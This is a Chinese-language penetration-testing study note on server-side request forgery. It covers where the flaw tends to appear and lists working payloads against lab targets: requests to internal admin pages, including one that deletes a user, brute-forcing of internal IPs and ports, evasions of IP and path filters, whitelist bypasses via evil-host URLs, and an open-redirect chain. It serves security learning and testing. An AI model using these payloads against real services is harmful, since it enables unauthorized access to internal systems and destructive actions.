## ==未归纳==

SSRF（服务器端请求伪造）漏洞是一种通过诱导服务器发起未经授权的请求，从而访问内部资源、敏感数据或对外部系统发起攻击的安全漏洞。

一般在用户可以请求服务器访问第三方资源的业务中存在

例如：

1. 发送 `HTTP` 请求：https://www.example.com/xxx.php?images=https://www.kali.org/kali.jpg
2. 服务器接收到请求之后获取 http://www.kali.org/kali.jpg 图片
3. 服务器获取到图片后将图片返回给用户

常见位置：

1. 分享：通过 `url` 地址分享网页内容

2. 转码服务

3. 在线翻译

4. 图片加载与下载：通过 `url` 地址加载或下载图片

5. 图片、文章收藏功能

6. 未公开的 `api` 实现以及其他调用 `url` 的功能

7. 从 `url` 关键字中寻找：

   `share` `wap` `url` `link` `src` `source` `target` `u` `3g` `display` `sourceURl` `imagesURL` `domain` 

8. `php` 中容易存在 `ssrf` 的函数：

   `curl`  `file_get_content` 

常见用途：

1. 任意文件读取

   > 可利用 `ssrf` 漏洞读取 `web` 服务用户能够访问的所有文件

2. 内外网 `ip` 端口和服务扫描

   > 通常情况下黑客只能扫描目标服务器的外网端口，可以利用 `ssrf` 漏洞扫描不对外开放的内网端口

3. 内外网主机漏洞利用

>  `get` 
>
>  >  `sql` 注入
>
>  `post` 
>
>  > `sql` 注入，`rce` 调用

修复思路：

1. 限制协议
2. 限制 `ip` 
3. 限制端口

可能存在 ssrf 的 url 样式

```
http://test.local/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
```

## 验证

**直接验证**

利用 `ssrf` 漏洞获取一个外网的页面

```
http://test.local/pikachu/vul/ssrf/ssrf_curl.php?url=http://hack.local/
```

![利用 ssrf 漏洞获取一个外网的页面](./../../../images/SSRF/%E5%88%A9%E7%94%A8%20ssrf%20%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%AA%E5%A4%96%E7%BD%91%E7%9A%84%E9%A1%B5%E9%9D%A2.png)

**`burp` 验证**

复制 `Collaborator` 域名

```
9gqpdvx9fs7gyu2rlergsb63cuil6cu1.oastify.com
```

![复制 Collaborator 域名](./../../../images/SSRF/%E5%A4%8D%E5%88%B6%20Collaborator%20%E5%9F%9F%E5%90%8D.png)

通过 `ssrf` 访问以上域名

```
http://test.local/pikachu/vul/ssrf/ssrf_curl.php?url=http://9gqpdvx9fs7gyu2rlergsb63cuil6cu1.oastify.com/
```

![通过 ssrf 访问以上域名](./../../../images/SSRF/%E9%80%9A%E8%BF%87%20ssrf%20%E8%AE%BF%E9%97%AE%E4%BB%A5%E4%B8%8A%E5%9F%9F%E5%90%8D.png)

> 若网站有 `cdn` 可通过 `dns 轮询` 得到主服务器 `ip` 

---

可能存在于库存的查询功能

通过后端 api 查询的功能可通过伪造 api 伪造用户请求

```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
```

> 库存检查功能，可以从内部系统获取数据

构造 api 请求

```
stockApi=http://localhost/admin
```

> 获取 `/admin` URL 的内容

```
stockApi=http://localhost/admin/delete?username=carlos
```

> 删除用户 `carlos` 
>
> 在面板查看删除链接源码即可构造删除命令

在控制台 ip 未知的情况下可通过爆破获取

```
stockApi=http://192.168.0.§1§/admin
```

有时可能需要爆破端口

```
stockApi=http://192.168.0.§1§:§80§/admin
```

某些网站可能对特定 IP 的访问或者特定的路径进行过滤

```
使用 127.0.0.1 的替代 IP 表示形式，例如 2130706433 、 017700000001 或 127.1 。
注册您自己的域名，解析为 127.0.0.1 。您也可以使用 spoofed.burpcollaborator.net 来实现此目的。(http://test.local:8080/admin)
使用 URL 编码或大小写变化来混淆被阻止的字符串（有时需要双 URL 编码）。(http://127.0.0.1:8080/AdMi%6e)
提供您控制的 URL，该 URL 会重定向到目标 URL。尝试对目标 URL 使用不同的重定向代码以及不同的协议。例如，在重定向期间从 http: URL 切换到 https: URL 已被证明可以绕过某些反 SSRF 过滤器。(https://127.0.0.1:8080/admin)
```

> 尝试访问一个目标本地 IP，并构造正常操作，若出发安全机制则是 IP 被过滤
>
> ```
> http://127.0.0.1:8080/product/stock/check?productId=1&storeId=1
> ```
>
> 通过替代 IP 表示形式，访问不存在的路径，若未触发安全机制则成功绕过 IP 过滤
>
> ```
> http://127.1:8080/test
> ```
>
> 得到 IP 后爆破路径，触发 WAF 则是路径被过滤
>
> ```
> http://127.1/admin
> ```
>
> 可尝试对路径大小写或者 URL 绕过（可尝试使用 Hackvertor 进行双 URL 编码）
>
> ```
> http://127.1/AdMi%4e
> ```

白名单过滤可以通过以下方式绕过

> - 您可以使用 `@` 字符将凭据嵌入 URL 中的主机名之前。例如：
>
>   ```
>   https://expected-host:fakepassword@evil-host
>   ```
>
> - 您可以使用 `#` 字符来指示 URL 片段。例如：
>
>   ```
>   https://evil-host#expected-host
>   ```
>
> - 您可以利用 DNS 命名层次结构将所需的输入放入您控制的完全限定的 DNS 名称中。例如：
>
>   ```
>   https://expected-host.evil-host
>   ```
>
> - 您可以对字符进行 URL 编码以混淆 URL 解析代码。
>
> - 如果实现过滤器的代码处理 URL 编码字符的方式与执行后端 HTTP 请求的代码不同，则这尤其有用。您还可以尝试双编码字符；一些服务器对它们收到的输入进行递归 URL 解码，这可能会导致进一步的差异。
>
> - 您可以结合使用这些技术。

有时可以通过利用开放重定向漏洞来绕过基于过滤器的防御。

> 例如，该应用程序包含一个开放重定向漏洞，其中以下 URL：
>
> ```
>  /product/nextProduct?currentProductId=6&path=/product?productId=3
> ```
>
> 返回重定向到：
>
> ```
>  /product?productId=3
> ```
>
> 您可以利用开放重定向漏洞绕过URL过滤，利用SSRF漏洞，如下：
>
> ```
> POST /product/stock HTTP/1.0
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 118
> 
> stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
> ```

若存在无回显的 ssrf 则可利用 Burp Collaborator 修改  Referer 标头中指定的 URL 测试

```
Referer: https://test.oastify.com/
```

可能存在 SSRF 的 URL

```
http://www.xxx.com/vul.php?url=http://www.xxc.com/xxx.jpg
http://share.xxx.com/index.php?url=http://test.com
```

